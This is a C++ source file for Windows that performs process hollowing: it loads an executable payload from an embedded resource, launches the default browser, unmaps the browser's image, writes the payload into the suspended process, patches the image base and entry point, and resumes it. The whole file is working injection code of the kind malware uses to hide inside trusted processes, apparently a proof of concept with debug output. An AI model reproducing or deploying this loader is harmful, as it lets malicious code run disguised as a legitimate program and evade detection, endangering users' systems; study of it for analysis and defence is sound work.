#include <windows.h>
#include <stdio.h>

#include "resource.h"
#include "createproc.h"
#include "ntdll_undoc.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

IMAGE_NT_HEADERS* get_nt_hrds(BYTE *pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER *idh = NULL;
    IMAGE_NT_HEADERS *inh = NULL;

    idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + idh->e_lfanew);
    return inh;
}

bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
{
    //check payload:
    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }
    printf("payload hdrs: %x\n", payload_nt_hdr->OptionalHeader.ImageBase);

    //create tatet process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    //get initial context of the target:
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    
    //get image base of the target:
    DWORD targetImageBase;
    DWORD PEB = context.Ebx;
    
    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, 4, NULL)) {
        return false;
    }

    //we will need this space to map our module:
    if (targetImageBase == payload_nt_hdr->OptionalHeader.ImageBase) {
        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)targetImageBase) != ERROR_SUCCESS) {
            return false;
        }
    }
    printf("targetImageBase = %x\n", targetImageBase);

    //try to allocate space that will be the most suitable for the payload:
    DWORD address = payload_nt_hdr->OptionalHeader.ImageBase;
    DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;

    LPVOID baseAddress = VirtualAllocEx(pi.hProcess, (LPVOID) address, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddress != (LPVOID)address) {
        //TODO: support the case when payload needs to be relocated
        return false;
    }

    printf("Allocated ImageBase: %p size: %x\n", baseAddress,  payloadImageSize);

    //copy payload's headers:
    DWORD hdrs_size = payload_nt_hdr->OptionalHeader.SizeOfHeaders;
    if (!WriteProcessMemory(pi.hProcess, baseAddress, payload, hdrs_size, NULL)) {
        return false;
    }

    printf("Copied payload's headers to: %x\n", baseAddress);

    LPVOID secptr = &(payload_nt_hdr->OptionalHeader);
    DWORD size_of_hdr = payload_nt_hdr->FileHeader.SizeOfOptionalHeader;
    printf("size_of_hdr = %x\n", size_of_hdr);

    secptr = LPVOID((DWORD) secptr + size_of_hdr);

    for (WORD i = 0; i < payload_nt_hdr->FileHeader.NumberOfSections; i++) {
       PIMAGE_SECTION_HEADER next_sec = (PIMAGE_SECTION_HEADER)((DWORD)secptr + (IMAGE_SIZEOF_SECTION_HEADER * i));

       LPVOID section_place = (BYTE*) baseAddress + next_sec->VirtualAddress;
       LPVOID section_raw_ptr = payload + next_sec->PointerToRawData;
       DWORD written;
       if (!WriteProcessMemory(pi.hProcess, section_place, section_raw_ptr, next_sec->SizeOfRawData, &written)) {
           return false;
       }
       if (written != next_sec->SizeOfRawData) return false;
    }

    //overwrite address stored in PEB
    DWORD written = 0;
    WriteProcessMemory(pi.hProcess, LPVOID(PEB + 8), &baseAddress, 4, &written);
    if (written != 4) {
        printf("Failed: %d\n", written);
        return false;
    }
    DWORD newEP = (DWORD) baseAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
    printf("newEP: %p\n", newEP);
    context.Eax = newEP;
    SetThreadContext(pi.hThread, LPCONTEXT(&context));
    printf("--\n");
    ResumeThread(pi.hThread);
    return false;
}

int main(int argc, char *argv[])
{
    load_ntdll_functions();
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return -1;
    }

    WCHAR targetPath[MAX_PATH];
    if (!get_default_browser(targetPath, MAX_PATH)) {
        return -1;
    }

    if (runPE32(targetPath, res_data, res_size)) {
        printf("Injected!\n");
    }

    printf("Loaded\n");
    
    system("pause");
    return 0;
}
